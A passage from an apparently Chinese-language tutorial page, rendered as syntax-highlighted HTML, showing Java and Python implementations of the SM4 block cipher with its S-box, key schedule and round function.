punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0xB3</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0xA9</span><span class="token punctuation">,</span> <span class="token number">0xC9</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span>                <span class="token number">0xDF</span><span class="token punctuation">,</span> <span class="token number">0x94</span><span class="token punctuation">,</span> <span class="token number">0xFA</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x8F</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0xF3</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0xBA</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span>                <span class="token number">0xE6</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0x4F</span><span class="token punctuation">,</span> <span class="token number">0xA8</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0xB2</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0xDA</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span>                <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x5E</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0xA2</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">,</span> <span class="token number">0xD4</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>                <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x9F</span><span class="token punctuation">,</span> <span class="token number">0xD3</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0xE7</span><span class="token punctuation">,</span> <span class="token number">0xA0</span><span class="token punctuation">,</span> <span class="token number">0xC4</span><span class="token punctuation">,</span> <span class="token number">0xC8</span><span class="token punctuation">,</span> <span class="token number">0x9E</span><span class="token punctuation">,</span> <span class="token number">0xEA</span><span class="token punctuation">,</span> <span class="token number">0xBF</span><span class="token punctuation">,</span> <span class="token number">0x8A</span><span class="token punctuation">,</span> <span class="token number">0xD2</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span>                <span class="token number">0xC7</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0xB5</span><span class="token punctuation">,</span> <span class="token number">0xA3</span><span class="token punctuation">,</span> <span class="token number">0xF7</span><span class="token punctuation">,</span> <span class="token number">0xF2</span><span class="token punctuation">,</span> <span class="token number">0xCE</span><span class="token punctuation">,</span> <span class="token number">0xF9</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0xA1</span><span class="token punctuation">,</span> <span class="token number">0xE0</span><span class="token punctuation">,</span> <span class="token number">0xAE</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0xA4</span><span class="token punctuation">,</span> <span class="token number">0x9B</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span>                <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0xF5</span><span class="token punctuation">,</span> <span class="token number">0x8C</span><span class="token punctuation">,</span> <span class="token number">0xB1</span><span class="token punctuation">,</span> <span class="token number">0xE3</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0xF6</span><span class="token punctuation">,</span> <span class="token number">0xE2</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x82</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0xCA</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0xC0</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span>                <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0xD5</span><span class="token punctuation">,</span> <span class="token number">0xDB</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0xDE</span><span class="token punctuation">,</span> <span class="token number">0xFD</span><span class="token punctuation">,</span> <span class="token number">0x8E</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span>                <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0x92</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0xBC</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0xD9</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0xD8</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span>                <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span> <span class="token number">0xCD</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0xBD</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0xB8</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0xB4</span><span class="token punctuation">,</span> <span class="token number">0xB0</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span>                <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0xB9</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0xC5</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0xC6</span><span class="token punctuation">,</span> <span class="token number">0x84</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xF0</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0xEC</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0xDC</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span>                <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0xEE</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0xD7</span><span class="token punctuation">,</span> <span class="token number">0xCB</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x48</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> temp <span class="token operator">=</span> <span class="token function">splitInt</span><span class="token punctuation">(</span>box_input<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//拆分32比特数</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> output <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//单个盒变换输出</span>        <span class="token comment">//盒变换</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            output<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span> <span class="token constant">SBOX</span><span class="token punctuation">[</span>temp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//将4个8位字节合并为一个字作为盒变换输出</span>        <span class="token keyword">return</span> <span class="token function">jointBytes</span><span class="token punctuation">(</span>output<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> output<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> output<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> output<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* 将input左移n位 */</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">shift</span><span class="token punctuation">(</span><span class="token keyword">int</span> input<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>input <span class="token operator">>>></span> <span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">-</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>input <span class="token operator">&lt;&lt;</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="代码实现python版"><a class="markdownIt-Anchor" href="#代码实现python版"></a> <strong>代码实现(Python版)</strong></h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">SM4Cipher</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> key<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">16</span><span class="token punctuation">:</span>            <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"SM4 key must be length of 16. "</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>_key_r <span class="token operator">=</span> self<span class="token punctuation">.</span>_generate_key<span class="token punctuation">(</span>key<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>block_size <span class="token operator">=</span> <span class="token number">16</span>    <span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> plaintext<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>_do<span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> self<span class="token punctuation">.</span>_key_r<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> ciphertext<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>_do<span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> self<span class="token punctuation">.</span>_key_r<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">_do</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> text<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> key_r<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        text_ <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token comment"># 将 128bit 转化成 4x32bit</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            text_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>text<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">:</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'big'</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            box_in <span class="token operator">=</span> text_<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> text_<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> text_<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">^</span> key_r<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            box_out <span class="token operator">=</span> self<span class="token punctuation">.</span>_s_box<span class="token punctuation">(</span>box_in<span class="token punctuation">)</span>            temp <span class="token operator">=</span> text_<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^</span> box_out <span class="token operator">^</span> self<span class="token punctuation">.</span>_rot_left<span class="token punctuation">(</span>box_out<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>_rot_left<span class="token punctuation">(</span>box_out<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>            temp <span class="token operator">=</span> temp <span class="token operator">^</span> self<span class="token punctuation">.</span>_rot_left<span class="token punctuation">(</span>box_out<span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>_rot_left<span class="token punctuation">(</span>box_out<span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">)</span>            text_ <span class="token operator">=</span> text_<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">[</span>temp<span class="token punctuation">]</span>        text_ <span class="token operator">=</span> text_<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment"># 结果逆序</span>        <span class="token comment"># 将 4x32bit 合并成 128bit</span>        result <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            result<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>text_<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'big'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">_generate_key</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> key<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""密钥生成"""</span>        key_r<span class="token punctuation">,</span> key_temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        FK <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xa3b1bac6</span><span class="token punctuation">,</span> <span class="token number">0x56aa3350</span><span class="token punctuation">,</span> <span class="token number">0x677d9197</span><span class="token punctuation">,</span> <span class="token number">0xb27022dc</span><span class="token punctuation">]</span>        CK <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x00070e15</span><span class="token punctuation">,</span> <span class="token number">0x1c232a31</span><span class="token punctuation">,</span> <span class="token number">0x383f464d</span><span class="token punctuation">,</span> <span class="token number">0x545b6269</span><span class="token punctuation">,</span> <span class="token number">0x70777e85</span><span class="token punctuation">,</span> <span class="token number">0x8c939aa1</span><span class="token punctuation">,</span> <span class="token number">0xa8afb6bd</span><span class="token punctuation">,</span> <span class="token number">0xc4cbd2d9</span><span class="token punctuation">,</span>              <span class="token number">0xe0e7eef5</span><span class="token punctuation">,</span> <span class="token number">0xfc030a11</span><span class="token punctuation">,</span> <span class="token number">0x181f262d</span><span class="token punctuation">,</span> <span class="token number">0x343b4249</span><span class="token punctuation">,</span> <span class="token number">0x50575e65</span><span class="token punctuation">,</span> <span class="token number">0x6c737a81</span><span class="token punctuation">,</span> <span class="token number">0x888f969d</span><span class="token punctuation">,</span> <span class="token number">0xa4abb2b9</span><span class="token punctuation">,</span>              <span class="token number">0xc0c7ced5</span><span class="token punctuation">,</span> <span class="token number">0xdce3eaf1</span><span class="token punctuation">,</span> <span class="token number">0xf8ff060d</span><span class="token punctuation">,</span> <span class="token number">0x141b2229</span><span class="token punctuation">,</span> <span class="token number">0x30373e45</span><span class="token punctuation">,</span> <span class="token number">0x4c535a61</span><span class="token punctuation">,</span> <span class="token number">0x686f767d</span><span class="token punctuation">,</span> <span class="token number">0x848b9299</span><span class="token punctuation">,</span>              <span class="token number">0xa0a7aeb5</span><span class="token punctuation">,</span> <span class="token number">0xbcc3cad1</span><span class="token punctuation">,</span> <span class="token number">0xd8dfe6ed</span><span class="token punctuation">,</span> <span class="token number">0xf4fb0209</span><span class="token punctuation">,</span> <span class="token number">0x10171e25</span><span class="token punctuation">,</span> <span class="token number">0x2c333a41</span><span class="token punctuation">,</span> <span class="token number">0x484f565d</span><span class="token punctuation">,</span> <span class="token number">0x646b7279</span><span class="token punctuation">]</span>        <span class="token comment"># 将 128bit 拆分成 4x32bit</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            temp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">:</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'big'</span><span class="token punctuation">)</span>            key_temp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> temp <span class="token operator">^</span> FK<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token comment"># 循环生成轮密钥</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            box_in <span class="token operator">=</span> key_temp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> key_temp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> key_temp<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">^</span> CK<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            box_out <span class="token operator">=</span> self<span class="token punctuation">.</span>_s_box<span class="token punctuation">(</span>box_in<span class="token punctuation">)</span>            key_r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key_temp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^</span> box_out <span class="token operator">^</span> self<span class="token punctuation">.</span>_rot_left<span class="token punctuation">(</span>box_out<span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>_rot_left<span class="token punctuation">(</span>box_out<span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">)</span>            key_temp <span class="token operator">=</span> key_temp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">[</span>key_r<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> key_r    <span class="token decorator annotation punctuation">@staticmethod</span>    <span class="token keyword">def</span> <span class="token function">_s_box</span><span class="token punctuation">(</span>n<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        BOX <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xD6</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0xFE</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xE1</span><span class="token punctuation">,</span> <span class="token number">0x3D</span><span class="token punctuation">,</span> <span class="token number">0xB7</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0xB6</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0xC2</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0xFB</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span>               <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x9A</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0xC3</span><span class="token punctuation">,</span> <span class="token number">0xAA</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x9C</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span>               <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0xF4</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0xEF</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0xED</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0xAC</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0xB3</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span>               <span class="token number">0xA9</span><span class="token punctuation">,</span> <span class="token number">0xC9</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token 